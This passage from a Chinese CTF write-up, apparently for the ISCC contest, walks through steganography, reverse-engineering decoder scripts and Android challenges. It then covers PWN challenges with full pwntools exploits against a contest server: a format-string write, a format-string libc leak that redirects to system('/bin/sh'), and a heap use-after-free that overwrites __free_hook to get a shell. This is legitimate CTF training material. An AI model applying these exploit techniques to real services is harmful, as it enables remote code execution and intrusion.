src=\"..\\..\\static\\image\\42e74bad8de44b1babc1f608ab41cd3e.png\" width=\"430\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">之后会发现binwalk中多出一个3.jpg。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后将3.jpg放入esteg中。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">先用：zsteg -a 3.jpg</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"238\" src=\"..\\..\\static\\image\\0bb8079298894a7e8260bf39c0dddde7.png\" width=\"378\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">再用：zsteg -e b1,r,lsb,yx 3.jpg -&gt; 1.jpg</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后得到图片</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"382\" src=\"..\\..\\static\\image\\6885aa245caf417a84de713c78bd90bc.png\" width=\"378\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"183\" src=\"..\\..\\static\\image\\f3f1d202a1e749088618e418d3ac4c7c.png\" width=\"405\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">和图片比对</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"204\" src=\"..\\..\\static\\image\\201a5300fefe4a10be18a96fa22a68e6.png\" width=\"378\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到flag。</p>\n<h3 id=\"%E7%9C%9F%E7%9B%B8%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">真相只有一个：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开得到三个文件，猜测flag在flag.txt中，但被隐藏起来，发现stream中存在压缩文件.</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用010Editor来改变hex头;</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"390\" src=\"..\\..\\static\\image\\e08d628a8125470cac22406a456786dd.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">另存为1.zip，得到压缩文件，发现有密码，密码应该在图片中。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用StegSolve文件查看通道，发现密码：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"445\" src=\"..\\..\\static\\image\\55017a4ecd6f4902a4de1740320adb14.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">虽然不对，但是应该没有问题，估计是后边还有，爆破得到密码：19981111；</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到流量文件。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"338\" src=\"..\\..\\static\\image\\9d37b32e5b124861a95363e71e6c9fa9.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"470\" src=\"..\\..\\static\\image\\aa6272148f564b8fae29d824706ec6f9.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">导出mp3文件。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"428\" src=\"..\\..\\static\\image\\545572b921b54ebeb533b2bc4ddfdfd2.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现摩斯电码：../.../-.-./-.-./--/../.../-.-.</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">解密得：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"239\" src=\"..\\..\\static\\image\\4749dfbe45674db4be676642645088e5.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用SNOW.EXE得到flag：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"99\" src=\"..\\..\\static\\image\\f17ba104769c4d4fb6bd8079de26b59b.png\" width=\"479\"/></p>\n<h2 id=\"Re%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Re：</h2>\n<h3 id=\"GetTheTable%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">GetTheTable：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">文件用ida打开。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">找到main函数，反编译。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"324\" src=\"..\\..\\static\\image\\6eeb230476ce4305a65c9f98ed6f7025.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">题目给的提示，找到正确的解密方式。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用工具试一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"76\" src=\"..\\..\\static\\image\\6b9904912ba7438d85bf67b5d5ca141c.png\" width=\"274\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Base58解码得到flag。</p>\n<h3 id=\"Amy's%20Code%3A\" style=\"margin-left:0;text-align:justify;\">Amy's Code:</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开文件，用ida32打开，先shift+f12。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">双击进入correct中</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"138\" src=\"..\\..\\static\\image\\4b868ea0886f4df28748b06a4d060dd1.png\" width=\"615\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">进入main中。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">跟进，f5反编译，然后进入sub_411433</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">在进入sub_412550。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"453\" src=\"..\\..\\static\\image\\e91c870538c8440f929cc46b88291edf.png\" width=\"378\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Python脚本解密得到flag：</p>\n<pre><code>a=[149,169,137,134,212,188,177,184,177,197,192,179,153,197,190,126,108,159,191,184]\nb='LWHFUENGDJGEFHYDHIGJ'\nflag=''\nstr=''\nfor i in range(len(b)):\n    str = str + chr(a[i]-ord(b[i]))\nfor j in range(len(a)):\n    flag = flag + chr(ord(str[j])^j)\nprint(flag)</code></pre>\n<h3 id=\"How_decode%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">How_decode：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">文件用ida打开，搜索main函数反编译，发现数据。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"364\" src=\"..\\..\\static\\image\\090c12a94fe24525ab36a647ef195485.png\" width=\"567\"/></p>\n<p></p>\n<pre><code>Exp：\n\n#include &lt;iostream&gt;\n\nusing namespace std;\n\n\n\nint main(int argc,char *argv[])\n\n{\n\n    string Flag = \"ISCC{012345678901}\";\n\n    int key[4] ={'I', 'S', 'C', 'C'};//格式\n\n    int x = 18;//十八个变量数组\n\n    int flagI[18];\n\n    printf(\"请输入ida中的18个变量:\");//用空格隔开\n\n    for(int i=0;i&lt;18;i++) //输入ida中的变量。\n\n    {\n\n           scanf(\"%d\",&amp;flagI[i]);\n\n       }\n\n    int z = 52/x + 6;\n\n    int basic1 = z * -0x61C88647;\n\n   \n\n    int y = flagI[0];\n\nfor (; z--;)\n\n {\n\n        int basic2 = (basic1 &gt;&gt; 2) &amp; 3;\n\n       \n\n        for (int a=x-1; a&gt;=0; a--) {\n\n            int b = flagI[(a + x - 1)%x];\n\n            flagI[a] -= ((y ^ basic1) + (b ^ key[basic2 ^ (a &amp; 3)])) ^ (((4 * y) ^ (b &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * b)));\n\n            y = flagI[a];\n\n        }\n\n       \n\n        basic1 = 156 + 0x61C88647;\n\n    }\n\n    printf(\"flag如下：\");\n\n    for (int j=0;j&lt;x;j++)\n\n        cout &lt;&lt; (char)flagI[j];\n\n    cout &lt;&lt; endl;\n\n    return 0;\n\n}</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">将变量输入即可得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"194\" src=\"..\\..\\static\\image\\1054e2faee244b52850953e65223b014.png\" width=\"567\"/></p>\n<p></p>\n<h3 id=\"Sad%20Code\" style=\"margin-left:0;text-align:justify;\">Sad Code</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">搜索找到main函数，f5反编译。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"221\" src=\"..\\..\\static\\image\\a62242f097994b5b90fb1c2c0607fc61.png\" width=\"559\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">找到解题关键。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">先放入脚本一：</p>\n<pre><code>from z3 import *\ns = Solver()\na=[Int('a[%d]'%i) for i in range(7)]\nb=Int('b')\n\n//以下都是ida中的值\ns.add(a[1] + 7 * a[0] - 4 * b - 2 * a[2] == 0x1FEE9B3DB)\ns.add(5 * a[2] + 3 * a[1] - a[0] - 2 * b == 0x12EF33D88)\ns.add(2 * a[0] + 8 * a[2] + 10 * b - 5 * a[1] == 0x47293F299)\ns.add(7 * b + 15 * a[0] - 3 * a[2] - 2 * a[1] == 0x7D3D1DA46)\ns.add(15 * a[3] + 35 * a[6] - a[4] - a[5] == 0x10359D2A4C)\ns.add(38 * a[5] + a[3] + a[6] - 24 * a[4] == 0x330898232)\ns.add(38 * a[4] + 32 * a[3] - a[5] - a[6] == 0x1650EEAB9D)\ns.add(a[3] + 41 * a[5] - a[4] - 25 * a[6] == 0x2B9ED1A3E)\nif s.check():\n    print(s.model())</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到的值再放入脚本二：</p>\n<pre><code>from Crypto.Util.number import long_to_bytes\na=[0]*7\na[2] = 1143816531\na[4] = 1414999372\nb = 1230193475\na[6] = 1464291709\na[3] = 1397509185\na[1] = 1297629761\na[5] = 1178879054\na[0] = 2068924756\nFLAG=long_to_bytes(b)\nfor i in a:\n    FLAG+=long_to_bytes(i)\nprint(FLAG)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">即可得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"447\" src=\"..\\..\\static\\image\\9f46da48ea3249349f806a3c99630c21.png\" width=\"554\"/></p>\n<p></p>\n<h3 id=\"VigenereLike%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">VigenereLike：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">将文件放入ida中打开，进入main函数查看。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"300\" src=\"..\\..\\static\\image\\a1e10b1ecf7e4ef1b509a6d88d0f0d1d.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现存在加密信息，写脚本解密即可。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Exp：</p>\n<pre><code>def fjl(x,y):#比大小\n    if x &gt; y: return 0\n    else: return -1\ndef fjl2(sum):\n    a=sum&amp;1\n    return a==0\ndef fjl3():\n    print(\"得到flag：\")\n\nx = [0xe4, 0x3d, 0x80, 0x24, 0xc7, 0x0d, 0xa3, 0xba,\n     0x00, 0xc7, 0x05, 0x8c, 0x64, 0x97, 0x4e, 0x0a,\n     0x3e, 0x4b, 0x51, 0x07, 0x8f, 0x79, 0x60, 0x5b, 0x9b]#脚本1解码后的16进制数\n\ny = [ 0x9A, 0x78, 0xB6, 0x12, 0xBE, 0x66, 0x8D, 0xCF, 0x51, 0x9E,\n    0x63, 0xCB, 0x4A, 0xD1, 0x1A, 0x59, 0x78, 0x1C, 0x17, 0x73,\n    0xF2, 0x1D, 0x05, 0x2F, 0xF0, 0xD7, 0xB3, 0x22, 0x5D, 0xAD,\n    0x0B, 0xE2]\nk = [0x32, 0x63, 0x65, 0x61, 0x39, 0x66, 0x30,\n     0x34, 0x63, 0x36, 0x33, 0x62, 0x34, 0x32, 0x38, 0x33, 0x39, 0x34, 0x30, 0x65,\n     0x63, 0x30, 0x65, 0x36, 0x64, 0x32, 0x39, 0x62, 0x65, 0x32, 0x38, 0x64]\nkk = []\nz = ''\nprint(\"调试:\\n\")\nfor i in range(len(x)):\n    kk.append(x[i]^y[i])\nfor i in range(len(kk)):\n    for j in range(128):\n        if (fjl((k[i]+0xd0)&amp;0xff,0xa) + j +2)&amp;0xff == kk[i]:\n            z = z + chr(j)\n            print(z)\n            break\nflag=list(z[::-1])\nfor j in range(len(flag)):\n    if ord('a') &lt;= ord(flag[j]) &lt;= ord('z'):\n        flag[j] = chr(ord(flag[j])^0x20)\n    elif ord('A') &lt;= ord(flag[j]) &lt;= ord('Z'):\n        flag[j] = chr(ord(flag[j])^0x20)\n    elif ord('0') &lt;= ord(flag[j]) &lt;= ord('9'):\n        a = ord(flag[j]) + 1\n        b = ord(flag[j]) - 1\n        if fjl2(ord(flag[j])):\n            flag[j] = chr(a)\n        else:\n            flag[j] = chr(b)\n    else:\n            pass\nprint(\"最终flag如下：\")\nfor i in range(len(flag)):\n    print(flag[i],end='')#输出flag</code></pre>\n<h3 id=\"Bob's%20Code%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Bob's Code：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Ida32打开文件，搜索main函数，在main_0中找到了str1和str2，比较一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"300\" src=\"..\\..\\static\\image\\7965cf907ad74234ba742616c97463e0.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">查看str1的处理。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"350\" src=\"..\\..\\static\\image\\265fa1eb79a24332bd2618a216cecc54.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">还需要对base换表，然后用exp跑出脚本。</p>\n<pre><code>import base64\n#HN-fjl\ndef printinfo():\n    print('--'*30)\n    print('flag如下:')\n\n\nx=list\\\n    ('.W1BqthGbfihKthkzV1tYc.hl5oY5qcbJ3XhXQXXlRoWBWdhRTXORpf1RwoF0.')\ny=len(x)\nfor j in range(y):\n if 'a'&lt;=x[j]&lt;='z':\n     x[j] = chr(((ord(x[j])-97-2)%26)+97)\n elif 'A'&lt;=x[j]&lt;='Z':\n     x[j] = chr(((ord(x[j])-65-2)%26)+65)\nprintinfo()\ny=''.join(x)+'=='\nprint(base64.b64decode(base64.b64decode(y.translate(str.maketrans(str1,str2)))))</code></pre>\n<h3 id=\"Ruststr%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Ruststr：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">用ida64打开iscc_reverse文件，然后查看main函数，发现。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"357\" src=\"..\\..\\static\\image\\76e0d0958d614aefb1f9ff529632b468.png\" width=\"554\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">像是base解密，尝试一下，发现只有base64解开然后是乱码。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">之后尝试一下hex头解码。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用脚本1：</p>\n<pre><code>import base64\n# base64解码\ndef base64_decode(base64_data):\n   temp = base64.b64decode(base64_data).hex()\n   return temp\n\ndata = \"5D2AJMcNo7oAxwWMZJdOCj5LUQePeWBbmw==\"\ntem = base64_decode(data)\nprint(tem)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><br/> #结果：e43d8024c70da3ba00c7058c64974e0a3e4b51078f79605b9b</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到16进制数。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">再利用脚本2：</p>\n<pre><code>def fjl(x,y):#比大小\n    if x &gt; y: return 0\n    else: return -1\ndef fjl2(sum):\n    a=sum&amp;1\n    return a==0\ndef fjl3():\n    print(\"得到flag：\")\n\nx = [0xe4, 0x3d, 0x80, 0x24, 0xc7, 0x0d, 0xa3, 0xba,\n     0x00, 0xc7, 0x05, 0x8c, 0x64, 0x97, 0x4e, 0x0a,\n     0x3e, 0x4b, 0x51, 0x07, 0x8f, 0x79, 0x60, 0x5b, 0x9b]#脚本1解码后的16进制数\n\ny = [ 0x9A, 0x78, 0xB6, 0x12, 0xBE, 0x66, 0x8D, 0xCF, 0x51, 0x9E,\n    0x63, 0xCB, 0x4A, 0xD1, 0x1A, 0x59, 0x78, 0x1C, 0x17, 0x73,\n    0xF2, 0x1D, 0x05, 0x2F, 0xF0, 0xD7, 0xB3, 0x22, 0x5D, 0xAD,\n    0x0B, 0xE2]\nk = [0x32, 0x63, 0x65, 0x61, 0x39, 0x66, 0x30,\n     0x34, 0x63, 0x36, 0x33, 0x62, 0x34, 0x32, 0x38, 0x33, 0x39, 0x34, 0x30, 0x65,\n     0x63, 0x30, 0x65, 0x36, 0x64, 0x32, 0x39, 0x62, 0x65, 0x32, 0x38, 0x64]\nkk = []\nz = ''\nprint(\"调试:\\n\")\nfor i in range(len(x)):\n    kk.append(x[i]^y[i])\nfor i in range(len(kk)):\n    for j in range(128):\n        if (fjl((k[i]+0xd0)&amp;0xff,0xa) + j +2)&amp;0xff == kk[i]:\n            z = z + chr(j)\n            print(z)\n            break\nflag=list(z[::-1])\nfor j in range(len(flag)):\n    if ord('a') &lt;= ord(flag[j]) &lt;= ord('z'):\n        flag[j] = chr(ord(flag[j])^0x20)\n    elif ord('A') &lt;= ord(flag[j]) &lt;= ord('Z'):\n        flag[j] = chr(ord(flag[j])^0x20)\n    elif ord('0') &lt;= ord(flag[j]) &lt;= ord('9'):\n        a = ord(flag[j]) + 1\n        b = ord(flag[j]) - 1\n        if fjl2(ord(flag[j])):\n            flag[j] = chr(a)\n        else:\n            flag[j] = chr(b)\n    else:\n            pass\nprint(\"最终flag如下：\")\nfor i in range(len(flag)):\n    print(flag[i],end='')#输出flag</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">最终得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"336\" src=\"..\\..\\static\\image\\f956f7b864944452b2e4b172fcc9c7a3.png\" width=\"412\"/></p>\n<p></p>\n<h2 id=\"Mobile%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Mobile：</h2>\n<h3 id=\"Mobile%20A%3A\" style=\"margin-left:0;text-align:justify;\">Mobile A:</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用jadxgui打开后发现flag被分为两部分，一部分为AES加密，一部分为md5；</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">AES中的密钥为K@e2022%%y的base64加密。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">偏移为：I&amp;V2022***的base64加密。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">内容为STk0OU11bnZiWCtvZGtpSUswK3Q2aHZxd2x2bTlIYkRjTFV4OWhZdEowbz0=的base64解密值。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到第一部分flag：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"253\" src=\"..\\..\\static\\image\\95e4b4ec35da4005ae1a22fbb6b1f8fd.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后是第二部分flag；</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用脚本获得：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">先将eauals中的值放入a中</p>\n<pre><code>a=' '#需要放入其中的值\nb=\\\n    [20,19,12,11,4,3,21,18,13,10,5,2,22,17,14,9,6,1,23,16,15,8,7,0]\nfor j in b:\n    print(a[j],end='')\n\n然后用上一个脚本中的值的放入下边的a中\n\nimport base64\ndef base64_decode(base64_x):\n    y=base64.b64decode(base64_x).hex()\n    return y\na = \"\"#上一个脚本的运行结果\nflag=base64_decode(a)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><br/> print(flag)#最后还需要md5解码。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"416\" src=\"..\\..\\static\\image\\333cc63028a84f76945eb7efad903a06.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">运行然后将得到的值md5解密即可；</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到第二部分为no；</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">连起来即可得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"MoblieB%3A\" style=\"margin-left:0;text-align:justify;\">MoblieB:</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">先利用jadxgui打开得到apk文件，得到加密的一串数字。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"116\" src=\"..\\..\\static\\image\\619e3b48bb2c4470b9b9aa8dde3ca9b8.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后改后缀解压得到一些文件。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"241\" src=\"..\\..\\static\\image\\687f37104c7f4d99b128155e472f959c.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">一个一个放入ida中，发现在so文件后一直有：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"500\" src=\"..\\..\\static\\image\\f6647ed4966e46cdb66385a427f3324b.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">十二串字符，调试几次偏移，得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用脚本：</p>\n<pre><code>def phpinfo():\n    print('flag如下:')\nx=\"5240520105205230123054040513013050130\"[:-1]#查看apk得到的值\n#下边是解压后ida中的值。\ny=\"MTURVPYCJGZOQNKASEWFIXBHLD\"\ny=y+y\nz=\"CKTUVBXSAFJDGHIMNYZOPQRWEL\"\nz=z+z\nm=\"WXOPZGNVYDEFIJCBKARLUQHMST\"\nm=m+m\ni=\"FBSNOPMACKDRQITUVWHZLJXYGE\"\ni=i+i\nn=\"OMEJCXYFZBQRAPGSDTINKLUHVW\"\nn=n+n\nq=\"XASQGMTFIRBVHEJUOCDYZPKLNW\"\nq=q+q\ng=\"EHWUVRYOPQSIBXJACTZGMNDFLK\"\ng=g+g\np=\"VWNIKAXMOGHLZBRDQJEUYFPCST\"\np=p+p\na=\"FDXYUKOPJMBCZLIGNVWSTEHAQR\"\na=a+a\nf=\"NSKBRTUZEJOPGHIFXCDAVWQYLM\"\nf=f+f\nb=\"CLYMVHXASTKNWIUOPZJDBQGREF\"\nb=b+b\nl=\"AYTNCBDRSQLZWXOPKJGEHIMFUV\"\nl=l+l\nbian=[5,1,51,2,52,12,512,3,53,13,513,23,523,123,5123,4,54,14,514,24,524,124,5124,34,534,134,5134,234,5234,1234,51234]\nx=list(map(int,x.split(\"0\")))\no=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"#列出\nt=[]\nfor r in x:\n      t.append(o[bian.index(r)])\ns=[y,z,m,i,n,q,g,p,a,f,b,l]\nphpinfo()\nfor r in range(12):\n      print(s[r][s[r].index(t[r],26)-9],end='')#结果加上ISCC{}即可。</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"378\" src=\"..\\..\\static\\image\\6125ca283892488698fc78a587d91104.png\" width=\"386\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Flag为ISCC{结果}。</p>\n<h2 id=\"PWN%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">PWN：</h2>\n<h3 id=\"create_id\" style=\"margin-left:0;text-align:justify;\">create_id</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">check一下发现是32程序。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">所以将文件放在ida32中打开，查看main函数。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"466\" src=\"..\\..\\static\\image\\dcc6195947e54f7b9fb65df2e1282ebf.png\" width=\"554\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现存在格式化字符串漏洞，让x==9，进入flag（）函数，可以直接cat到flag，所以利用漏洞将x的值修改为9。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Exp：</p>\n<pre><code>from pwn import *\ndef tishi():\n     print(\"flag在后边：\")\na = remote('123.57.69.203',5310)\nx = int(a.recvuntil('\\n')[:-1],16)\na.sendline('6')\na.sendline('7')\na.sendline('8')#使x的值为9,即可得到flag。\na.sendlineafter(\"What's your name?\\n\",b\"%9c%12$n\"+p32(x))\nFlag = a.recvuntil(\"}\")\ntishi()\nprint(Flag)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"157\" src=\"..\\..\\static\\image\\192539d334d84f319e32addfad55c5dd.png\" width=\"554\"/></p>\n<p></p>\n<h3 id=\"sim_treasure%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">sim_treasure：</h3>\n<p style=\"margin-left:.0001pt;text-align:left;\">ida打开查看发现为循环格式化字符串漏洞。</p>\n<p style=\"margin-left:.0001pt;text-align:left;\">测定偏移量为6，然后打印libc_start_main的地址，<span style=\"color:#333333;\">计算基地址偏移量，将system写到code段，code地址距离main长度为3</span>。</p>\n<pre><code>from pwn import *\ncontext(arch='i386')\ndef tiqu():\n    print(\"利用ls和cat发现并得到flag\")\nx = remote('123.57.69.203',7010)\ntiqu()\na = ELF(\"sim_treasure\")#将文件名字改为sim_treasure\nb = ELF(\"libc-2.27.so\")\noffset = 6 #偏移量\nx.recvuntil(\"Can you find the magic word?\\n\")\nx.sendline('%35$p')\nb_base = int(x.recvuntil(b'\\n')[:-1],16)-b.symbols['__libc_start_main']-241\nsystem = b_base+b.symbols['system']#利用system命令来得到flag。\nsh = b_base+0x17E3CF\nsuccess(hex(b_base))\n\nx.sendline('%3$p')\ncode_addr = int(x.recvuntil(b'\\n')[:-1],16)-0x16CA\nsuccess(hex(code_addr))\nx.sendline('%2$p')\neip_addr = int(x.recvuntil(b'\\n')[:-1],16)+4\n\nPayload = fmtstr_payload(offset,{code_addr+0x2A60:system})\nx.sendline(Payload)\nx.send(b'/bin/sh\\x00')\nsleep(0.3)\n\nx.interactive()</code></pre>\n<p style=\"margin-left:.0001pt;text-align:left;\">然后ls一下发现flag.txt文件，继续cat即可。</p>\n<p style=\"margin-left:.0001pt;text-align:left;\"><img alt=\"\" height=\"690\" src=\"..\\..\\static\\image\\44251d46e4d04c688491a764a36f6b5f.png\" width=\"567\"/></p>\n<p></p>\n<h3 id=\"untidy_note%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">untidy_note：</h3>\n<p style=\"margin-left:0;\">将文件放入ida中，经查看发现存在UAF和堆溢出漏洞，写入eval和system得到flag。</p>\n<p style=\"margin-left:0;\"></p>\n<pre><code>from pwn import *\ncontext(arch='amd64')\n\nfp1 = 'untidy_note'\nr = remote('123.57.69.203',7030)\nprint(\"利用ls和cat得到flag\")\nfp2 = ELF(fp1)#获取文件信息\nfp3 = ELF('libc-2.27.so')#获取文件信息\ndef Edit(index,payload):\n    r.sendlineafter(\"Your choose is:\\n\",'3')\n    r.sendlineafter(\"index:\\n\",str(index))\n    r.sendlineafter(\"the size is:\\n\",str(len(payload)))\n    r.sendafter(\"Content:\\n\",payload)\n\ndef Free(index):\n    r.sendlineafter(\"Your choose is:\\n\",'2')\n    r.sendlineafter(\"index:\\n\\n\",str(index))\n\ndef Show(index):\n    r.sendlineafter(\"Your choose is:\\n\",'4')\n    r.sendlineafter(\"index:\\n\",str(index))\n\ndef Allocate(size=0x18):\n    r.sendlineafter(\"Your choose is:\\n\",'1')\n    r.sendlineafter(\"the note size is:\\n\",str(size))\n\nr.sendlineafter(\"Welcome to use untidy_note,Your name is:\"\n                \"\",'HN-fjl')\nfor i in range(26):\n    Allocate(0x1f)\nAllocate(0x8)\nfor j in range(26):\n    Free(j)\nEdit(26, b'a'*0x18+p32(0x11))\nAllocate()\nAllocate()\nShow(1)\nfp3_base = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))-998-10-fp3.symbols['__malloc_hook']\nfree_hook = fp3_base+fp3.symbols['__free_hook']\nsystem = fp3_base+fp3.symbols['system']\nsuccess(\"system -&gt; \"+hex(system))\nsuccess(\"fp3_base -&gt; \"+hex(fp3_base))\n\nAllocate(0x1f)\nAllocate(0x1f)\nAllocate(0x1f)\nAllocate(0x1f)\nAllocate(0x1f)\nAllocate(0x1f)\nAllocate(0x1f)\n\nFree(4)\nFree(5)\nFree(6)\nEdit(6,p64(free_hook))\nAllocate(0x1f)\nAllocate(0x1f)\nEdit(8,p64(system))\n\nAllocate(0x18)\nEdit(9,b'/bin/sh\\x00')\nFree(9)\n\nr.interactive()</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后ls一下，发现flag.txt，继续cat flag.txt即可。</p>\n<h3 id=\"%E8%B7%B3%E4%B8%80%E8%B7%B3%EF%BC%9A\" 